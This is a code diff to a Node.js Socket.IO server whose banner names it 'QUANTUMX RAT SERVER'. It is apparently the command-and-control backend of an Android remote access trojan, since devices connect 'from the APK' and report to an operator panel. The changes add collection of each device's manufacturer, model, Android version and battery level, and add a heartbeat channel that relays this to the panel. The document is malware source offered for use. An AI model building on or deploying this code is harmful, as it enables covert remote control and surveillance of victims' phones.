@@ -94,7 +94,7 @@ app.post('/api/device/register', (req, res) => {
     
     devices.set(deviceId, deviceInfo);
     
-    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
+    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
     
     res.json({ success: true, deviceId, message: 'Device registered' });
 });
@@ -180,33 +180,81 @@ app.post('/api/device/command/result', (req, res) => {
 io.on('connection', (socket) => {
     console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
     
+    // ===== DEVICE CONNECT (DARI APK) =====
     socket.on('device-connect', (data) => {
-        const { deviceId, deviceName } = data;
+        const { 
+            deviceId, 
+            deviceName, 
+            androidVersion, 
+            manufacturer, 
+            model, 
+            batteryLevel 
+        } = data;
         
         socket.deviceId = deviceId;
         socket.join(deviceId);
         
+        // Update atau simpan device dengan DATA LENGKAP
         if (devices.has(deviceId)) {
             const device = devices.get(deviceId);
             device.online = true;
             device.lastSeen = new Date().toISOString();
+            device.deviceName = deviceName || device.deviceName;
+            device.androidVersion = androidVersion || device.androidVersion;
+            device.manufacturer = manufacturer || device.manufacturer;
+            device.model = model || device.model;
+            device.batteryLevel = batteryLevel || device.batteryLevel;
             devices.set(deviceId, device);
         }
         
-        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId})`);
+        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
         
+        // KIRIM DATA LENGKAP KE PANEL!
         io.emit('device-status', {
             deviceId,
+            deviceName,
+            androidVersion,
+            manufacturer,
+            model,
+            batteryLevel,
             status: 'online',
             timestamp: new Date().toISOString()
         });
     });
     
+    // ===== HEARTBEAT DARI APK =====
+    socket.on('heartbeat', (data) => {
+        const { deviceId, batteryLevel, deviceName, androidVersion } = data;
+        
+        if (devices.has(deviceId)) {
+            const device = devices.get(deviceId);
+            device.lastSeen = new Date().toISOString();
+            device.online = true;
+            device.batteryLevel = batteryLevel || device.batteryLevel;
+            device.deviceName = deviceName || device.deviceName;
+            device.androidVersion = androidVersion || device.androidVersion;
+            devices.set(deviceId, device);
+        }
+        
+        // KIRIM HEARTBEAT KE PANEL (UPDATE DATA)
+        io.emit('heartbeat', {
+            deviceId,
+            batteryLevel,
+            deviceName,
+            androidVersion,
+            timestamp: new Date().toISOString()
+        });
+        
+        console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
+    });
+    
+    // ===== PANEL CONNECT =====
     socket.on('panel-connect', () => {
         socket.isPanel = true;
         console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
     });
     
+    // ===== DISCONNECT =====
     socket.on('disconnect', () => {
         if (socket.deviceId) {
             const deviceId = socket.deviceId;
@@ -256,7 +304,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔═══════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v2.0           ║
+║    QUANTUMX RAT SERVER v3.0           ║
 ║    RUNNING ON PORT: ${PORT}                      ║
 ║    WEBSOCKET: ws://localhost:${PORT}             ║
 ║    API: http://localhost:${PORT}/api            ║
